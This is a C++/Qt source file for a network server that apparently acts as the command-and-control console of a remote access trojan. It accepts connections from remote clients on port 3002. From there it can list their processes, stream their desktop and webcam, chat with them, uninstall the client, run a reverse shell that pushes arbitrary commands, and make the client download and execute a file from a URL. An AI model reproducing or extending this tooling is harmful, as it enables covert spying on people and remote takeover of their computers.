#include "NetServerService.h"
#include "NetClientService.h"
#include "concurrent/events/net/NetEvent.h"
#include "concurrent/events/net/ClientNetEventExtendedInfo.h"

#include "concurrent/events/net/MediaClientNetEvent.h"

#include "concurrent/events/net/ProcessListClientEvent.h"

#include "concurrent/events/net/DesktopConfigClientNetEvent.h"

#include "RemoteClient.h"
#include <QTimer>

#include "shared/net/packets/PacketPresentation.h"
#include "shared/net/packets/PacketDesktopResponse.h"
#include "shared/net/packets/PacketProcessResponse.h"
#include "shared/net/packets/PacketCameraConfigResponse.h"
#include "concurrent/events/net/CameraConfigClientNetEvent.h"
#include "shared/net/packets/PacketCameraRequest.h"
#include "shared/net/packets/PacketProcessRequest.h"
#include "shared/net/packets/PacketMediaConfigRequest.h"
#include "shared/net/packets/PacketDesktopConfigResponse.h"
#include "shared/net/packets/PacketDesktopRequest.h"
#include "shared/net/packets/PacketMediaResponse.h"
#include "shared/net/packets/PacketShell.h"
#include "concurrent/events/net/RemoteShellNetClientEvent.h"
#include "shared/net/packets/packet_defs.h"
#include "shared/net/packets/PacketConnection.h"
#include "shared/net/packets/PacketChat.h"
#include "concurrent/events/net/ChatNetClientEvent.h"


NetServerService::NetServerService(): serverSocket(new QTcpServer(this))
{
}

NetServerService::~NetServerService()
{
	delete serverSocket;
}

void NetServerService::startService()
{
	QTimer::singleShot(200, this, &NetServerService::onPingAppTimer);

	qDebug() << __FUNCTION__ " Running on Main Thread? " <<
		(QThread::currentThread() == QApplication::instance()->thread())
		<< " Current Thread Id:Name: " << QThread::currentThreadId() << ":"
		<< QThread::currentThread()->objectName();


	//connect(server_socket, SIGNAL(newConnection()), this, SLOT(OnNewClientConnection()));
	bool success = connect(serverSocket, &QTcpServer::newConnection, this,
	                       &NetServerService::onNewClientConnection);
	if (!success)
		throw new AppException("Failed to connect signal");


	if (serverSocket->listen(QHostAddress::Any, 3002))
		reporter.Info(QString("Server listening on %1").arg(3002));
}


void NetServerService::stopServer()
{
	serverSocket->close();
	clients.clear();
}


void NetServerService::onClientDisconnected(const QSharedPointer<NetClientService>& client)
{
	// QSharedPointer<RemoteClient> client = clients.value(disconnectedSocket->socketDescriptor());
	if (client == Q_NULLPTR)
		return;

	clientsMutex.lockForWrite();
	const QMap<long long, QSharedPointer<RemoteClient>>::iterator iterator =
		clients.find(client->getSocketDescriptor());

	QSharedPointer<RemoteClient> remoteClient = Q_NULLPTR;
	if (iterator != clients.end())
	{
		remoteClient = iterator.value();
		clients.erase(iterator);
	}
	clientsMutex.unlock();

	if (remoteClient != Q_NULLPTR)
	{
		const QSharedPointer<ClientNetEvent>
			event(new ClientNetEvent(NetEventType::Disconnected, remoteClient->getClient()));
		emit sendNetClientEventToAppPtr(event);
	}
}

void NetServerService::onNewClientConnection()
{
	QTcpSocket* clientSocket = serverSocket->nextPendingConnection();
	qint64 clientId = clientSocket->socketDescriptor();

	// At this time this Uuid is redundant, I may make use of it in the future?
	const QUuid remoteClientUuid = QUuid::createUuid();

	const QSharedPointer<Client> client = QSharedPointer<Client>::create(clientId);

	QSharedPointer<NetClientService> netClientService(new NetClientService(sharedFromThis(), clientSocket));
	const QSharedPointer<ClientContext> clientContext(new ClientContext(sharedFromThis(), netClientService));
	const QSharedPointer<RemoteClient> remoteClient(new RemoteClient(remoteClientUuid, client, clientContext));

	clientsMutex.lockForWrite();
	clients.insert(clientId, remoteClient);
	clientsMutex.unlock();

	connect(netClientService.get(), &NetClientService::packetReceived, this, &NetServerService::onClientPacketReceived);
	connect(netClientService.get(), &NetClientService::presentPacketReceived, this,
	        &NetServerService::onPresentationPacket);

	Q_ASSERT(connect(netClientService.get(), &NetClientService::desktopConfigPacketReceived, this,
		&NetServerService::onDesktopConfigPacketReceived));

	Q_ASSERT(connect(netClientService.get(), &NetClientService::desktopPacketReceived, this,
		&NetServerService::onDesktopPacketReceived));

	Q_ASSERT(connect(netClientService.get(), &NetClientService::cameraConfigPacketReceived, this,
		&NetServerService::onCameraConfigPacketReceived));

	Q_ASSERT(connect(netClientService.get(), &NetClientService::cameraPacketReceived, this,
		&NetServerService::onCameraPacketReceived));

	connect(netClientService.get(), &NetClientService::processPacketReceived, this,
	        &NetServerService::onProcessPacketReceived);

	connect(netClientService.get(), &NetClientService::shellPacketReceived, this,
	        &NetServerService::onShellPacketReceived);

	Q_ASSERT(connect(netClientService.get(), &NetClientService::chatPacketReceived, this,
		&NetServerService::onChatPacketReceived));

	remoteClient->appendExpectedPacket(PacketType::Presentation);

	netClientService->interact();

	// reporter.Info(QString("New connection try from %s").arg(getIPv4AddrString(client)));
}


bool NetServerService::is_listening() const
{
	return serverSocket->isListening();
}


void NetServerService::set_reporter(const Reporter& reporter)
{
	// TODO: delete this
	this->reporter = reporter;
}

// Presentation info
void NetServerService::requestClientInfo(qint64 clientId)
{
	PacketPresentation packet;
	packet.setDetails(Extended);

	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->appendExpectedPacket(PacketType::Presentation);
	});
}

void NetServerService::onPresentationPacket(PacketPresentation& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(netClientService->getSocketDescriptor());
	if (remoteClient->expectsPacketAndPop(packet.type()))
	{
		remoteClient->getClient()->setOs(packet.getOs());
		remoteClient->getClient()->setPcName(packet.getPcName());


		// ClientNetEvent event(PresentationData, remoteClient->getClient());

		if (packet.getDetails() == Basic)
		{
			// ClientNetEvent event(PresentationData, remoteClient->getClient());
			// emit sendNetClientEventToApp(event);

			const auto event = QSharedPointer<ClientNetEvent>::create(NetEventType::PresentationData,
			                                                          remoteClient->getClient());
			emit sendNetClientEventToAppPtr(event);
		}
		else
		{
			// ClientNetEvent event(PresentationDataExtended, remoteClient->getClient());
			const QSharedPointer<ClientNetEventExtendedInfo> eventEx = QSharedPointer<ClientNetEventExtendedInfo>(
				new ClientNetEventExtendedInfo(remoteClient->getClient(), packet.getEnvironment()));

			emit sendNetClientEventToAppPtr(eventEx);
		}
	}
	else
	{
		throw QString("Unexpected packet");
	}
}

// Process
void NetServerService::requestClientProcessList(qint64 clientId)
{
	const PacketProcessRequest packet;
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->appendExpectedPacket(PacketType::ProcessList);
	});
}

void NetServerService::onProcessPacketReceived(const PacketProcessResponse& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(netClientService->getSocketDescriptor());
	if (remoteClient->expectsPacketAndPop(packet.type()))
	{
		const auto event = QSharedPointer<ProcessListClientEvent>(
			new ProcessListClientEvent(remoteClient->getClient(), packet.processes));
		emit sendNetClientEventToAppPtr(event);
	}
}

// Desktop 

void NetServerService::requestDesktopConfiguration(qint64 clientId)
{
	const PacketMediaConfigRequest packet(PacketType::DesktopConfig);
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		if (found)
			remoteClient->appendExpectedPacket(PacketType::DesktopConfig);
	});
}

void NetServerService::onShellPacketReceived(const PacketShell& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(netClientService->getSocketDescriptor());
	if (remoteClient->expectsPacket(packet.type()))
	{
		const auto event = QSharedPointer<RemoteShellNetClientEvent>(
			new RemoteShellNetClientEvent(remoteClient->getClient(), packet.shellAction, packet.data));

		emit sendNetClientEventToAppPtr(event);
	}
	else
	{
		// TODO: Close the connection
	}
}

void NetServerService::onChatPacketReceived(const PacketChat& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(netClientService->getSocketDescriptor());
	if (remoteClient->expectsPacket(packet.type()))
	{
		const auto event = QSharedPointer<ChatNetClientEvent>(
			new ChatNetClientEvent(remoteClient->getClient(), packet.action, packet.message));

		emit sendNetClientEventToAppPtr(event);
	}
	else
	{
		// TODO: Close the connection
	}
}


void NetServerService::onDesktopConfigPacketReceived(const PacketDesktopConfigResponse& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(netClientService->getSocketDescriptor());
	if (remoteClient->expectsPacket(packet.type()))
	{
		const auto event = QSharedPointer<DesktopConfigClientNetEvent>(
			new DesktopConfigClientNetEvent(remoteClient->getClient(), packet.screens));
		emit sendNetClientEventToAppPtr(event);
	}
}

void NetServerService::requestStartDesktopSession(qint64 clientId, const QString& selectedDisplay)
{
	const QSharedPointer<Client> client = getClientById(clientId);
	if (client == Q_NULLPTR)
		return;
	Q_ASSERT(!client->isStreamingDesktop());
	client->setDesktopStreamingState(Started);

	PacketDesktopRequest packet(MediaAction::Start);
	packet.displayNames.clear();
	packet.displayNames.append(selectedDisplay);
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		if (found)
			remoteClient->appendExpectedPacket(PacketType::Desktop);
	});
}

void NetServerService::requestPauseDesktopSession(qint64 clientId)
{
	const QSharedPointer<Client> client = getClientById(clientId);
	if (client == Q_NULLPTR)
		return;
	Q_ASSERT(client->isStreamingDesktop());
	client->setDesktopStreamingState(Paused);
	// TODO: remove expected Camera packet type
	const PacketDesktopRequest packet(MediaAction::Pause);
	sendPacket(clientId, packet, nullptr);
}

void NetServerService::requestStopDesktopSession(qint64 clientId)
{
	QSharedPointer<Client> client = getClientById(clientId);
	if (client == Q_NULLPTR)
	{
		// This may happen If user disconnected but we kept the desktop window open and then we close it
		return;
	}
	if (!client->isStreamingDesktop())
	{
		// Not streaming
		return;
	}

	client->setDesktopStreamingState(Stopped);

	const PacketDesktopRequest packet(MediaAction::Stop);
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->removeExpectedPacket(PacketType::Desktop);
	});
}

void NetServerService::requestUninstall(qint64 clientId)
{
	const PacketConnection packet(ConnectionAction::Uninstall);
	sendPacket(clientId, packet, Q_NULLPTR);
	onRequestCloseClientConnection(clientId, false);
}

void NetServerService::onDesktopPacketReceived(PacketDesktopResponse& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(netClientService->getSocketDescriptor());
	if (remoteClient->expectsPacket(packet.type()))
	{
		const auto event = QSharedPointer<MediaClientNetEvent>(
			new MediaClientNetEvent(NetEventType::DesktopData, remoteClient->getClient(), packet.image));
		emit sendNetClientEventToAppPtr(event);
	}
}

void NetServerService::requestCameraConfiguration(qint64 clientId)
{
	const PacketMediaConfigRequest packet(PacketType::CameraConfig);
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->appendExpectedPacket(PacketType::CameraConfig);
		remoteClient->appendExpectedPacket(PacketType::CameraError);
	});
}

void NetServerService::onCameraConfigPacketReceived(const PacketCameraConfigResponse& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = clients[netClientService->getSocketDescriptor()];
	if (remoteClient->expectsPacket(packet.type()))
	{
		const auto event = QSharedPointer<CameraConfigClientNetEvent>(
			new CameraConfigClientNetEvent(remoteClient->getClient(), packet.availableCameras));
		emit sendNetClientEventToAppPtr(event);
	}
}


void NetServerService::requestStartCameraSession(qint64 clientId, const QString& cameraDeviceName)
{
	QSharedPointer<Client> client = getClientById(clientId);
	client->setCameraStreamingState(MediaState::Started);

	PacketCameraRequest packet(MediaAction::Start);
	packet.selectedCameraDeviceName = cameraDeviceName;
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->appendExpectedPacket(PacketType::Camera);
		remoteClient->appendExpectedPacket(PacketType::CameraError);
	});
}

void NetServerService::requestPauseCameraSession(qint64 clientId)
{
	QSharedPointer<Client> client = getClientById(clientId);
	client->setCameraStreamingState(MediaState::Paused);

	const PacketCameraRequest packet(MediaAction::Pause);
	sendPacket(clientId, packet, nullptr);
}

void NetServerService::requestStopCameraSession(qint64 clientId)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);
	if (remoteClient == Q_NULLPTR) // if we close a camera window from a disconnected client
		return;
	QSharedPointer<Client> client = remoteClient->getClient();
	if (!client->isStreamingWebcam())
	{
		// Not streaming
		return;
	}

	client->setCameraStreamingState(Stopped);
	const PacketCameraRequest packet(MediaAction::Stop);
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->removeExpectedPacket(PacketType::Camera);
		remoteClient->removeExpectedPacket(PacketType::CameraError);
	});
}


void NetServerService::onCameraPacketReceived(const PacketMediaResponse& packet)
{
	auto netClientService = static_cast<NetClientService*>(sender());
	QSharedPointer<RemoteClient> remoteClient = clients[netClientService->getSocketDescriptor()];
	if (remoteClient->expectsPacket(packet.type()))
	{
		const auto event = QSharedPointer<MediaClientNetEvent>(
			new MediaClientNetEvent(NetEventType::CameraData, remoteClient->getClient(), packet.image));
		emit sendNetClientEventToAppPtr(event);
	}
}

// CAMERA HANDLING END


void NetServerService::requestStartReverseShell(qint64 clientId)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);
	if (remoteClient == Q_NULLPTR)
		return;
	const QSharedPointer<Client> client = remoteClient->getClient();

	PacketShell packet;
	packet.shellAction = ShellAction::Start;
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->appendExpectedPacket(PacketType::Shell);
	});
}

void NetServerService::requestStartChat(qint64 clientId)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);

	if (remoteClient == Q_NULLPTR)
		return;

	const QSharedPointer<Client> client = remoteClient->getClient();

	const PacketChat packet(ChatAction::Start);

	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->appendExpectedPacket(PacketType::Chat);
	});
}

void NetServerService::closeChat(qint64 clientId)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);

	if (remoteClient == Q_NULLPTR)
		return;

	const QSharedPointer<Client> client = remoteClient->getClient();

	const PacketChat packet(ChatAction::Close);

	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->removeExpectedPacket(PacketType::Chat);
	});
}

void NetServerService::sendChatMessage(qint64 clientId, const QString& message)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);

	if (remoteClient == Q_NULLPTR)
		return;

	const QSharedPointer<Client> client = remoteClient->getClient();

	PacketChat packet(ChatAction::AddMessage);
	packet.message = message;
	sendPacket(clientId, packet, Q_NULLPTR);
}

void NetServerService::requestAddShellCommand(qint64 clientId, const QString& command)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);

	if (remoteClient == Q_NULLPTR)
		return;

	const QSharedPointer<Client> client = remoteClient->getClient();

	PacketShell packet;
	packet.data = command;
	packet.shellAction = ShellAction::Push;
	sendPacket(clientId, packet, Q_NULLPTR);
}

void NetServerService::requestDownloadAndExecute(qint64 clientId, const QString& url)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);

	if (remoteClient == Q_NULLPTR)
		return;

	const QSharedPointer<Client> client = remoteClient->getClient();

	PacketShell packet;
	packet.data = url;
	packet.shellAction = ShellAction::DownloadExec;
	sendPacket(clientId, packet, Q_NULLPTR);
}

void NetServerService::requestStopReverseShell(qint64 clientId)
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);
	if (remoteClient == Q_NULLPTR)
		return;

	QSharedPointer<Client> client = remoteClient->getClient();

	PacketShell packet;
	packet.shellAction = ShellAction::Stop;
	sendPacket(clientId, packet, [](const QSharedPointer<RemoteClient>& remoteClient, bool found)
	{
		remoteClient->removeExpectedPacket(PacketType::Shell);
	});
}

void NetServerService::onRequestCloseClientConnection(qint64 clientId, bool sendClosePacket /* = true*/)
{
	clientsMutex.lockForWrite();

	if (sendClosePacket)
	{
		const QMap<long long, QSharedPointer<RemoteClient>>::iterator iterator = clients.find(clientId);
		if (Q_UNLIKELY(iterator == clients.end()))
			return;

		QSharedPointer<RemoteClient> remoteClient = *iterator;
		remoteClient->getNetClientService()->closeConnection(true);
	}

	clients.remove(clientId);
	clientsMutex.unlock();
}

void NetServerService::sendPacket(qint64 clientId, const Packet& packet,
                                  void (*beforeSendCallback)(const QSharedPointer<RemoteClient>& remoteClient,
                                                             bool found))
{
	QSharedPointer<RemoteClient> remoteClient = getRemoteClient(clientId);

	if (remoteClient != Q_NULLPTR)
	{
		if (beforeSendCallback != Q_NULLPTR)
			beforeSendCallback(remoteClient, true);
		remoteClient->getNetClientService()->sendPacket(packet);
	}
}

void NetServerService::onClientPacketReceived(const Packet& packet)
{
	// QSharedPointer<Packet> packet;
	// QSharedPointer<PacketLoginRequest> aaa = packet.dynamicCast<PacketLoginRequest>();
}

void NetServerService::recvPingFromApp()
{
	qDebug() << "[NetServerService] received ping from app";
}


void NetServerService::onPingAppTimer()
{
	qDebug() << "[NetServerService] Sending ping to App";
	emit sendPingToApp();

	// sendTestNetEvent();
}

void NetServerService::sendTestNetEvent()
{
	QSharedPointer<Client> client = QSharedPointer<Client>(new Client(12, "Windows", "MyPc"));
	// ClientNetEvent event(NewConnection, client);
	// emit sendNetClientEventToApp(event);
	auto event = QSharedPointer<ClientNetEvent>::create(NetEventType::NewConnection, client);
	emit sendNetClientEventToAppPtr(event);

	QSharedPointer<Client> client2 = QSharedPointer<Client>(new Client(13, "Windows", "MyPc"));
	const QSharedPointer<ClientNetEvent> clientNetEvent = QSharedPointer<ClientNetEvent>::create(
		NetEventType::NewConnection, client2);

	emit clientDataReceivedPtr(clientNetEvent);
}

QSharedPointer<NetClientService> NetServerService::getNetClientService(qint64 clientId)
{
	return clients[clientId]->getContext()->getNetClientService();
}

QSharedPointer<Client> NetServerService::getClientById(qint64 clientId)
{
	clientsMutex.lockForRead();

	QMap<long long, QSharedPointer<RemoteClient>>::const_iterator iterator = clients.constFind(clientId);
	QSharedPointer<Client> client;
	if (iterator != clients.constEnd())
	{
		client = iterator.value()->getClient();
	}

	clientsMutex.unlock();
	return client;
}

QSharedPointer<RemoteClient> NetServerService::getRemoteClient(qint64 clientId)
{
	clientsMutex.lockForRead();

	QMap<long long, QSharedPointer<RemoteClient>>::const_iterator iterator = clients.constFind(clientId);
	QSharedPointer<RemoteClient> remoteClient;
	if (iterator != clients.constEnd())
	{
		remoteClient = *iterator;
	}

	clientsMutex.unlock();
	return remoteClient;
}
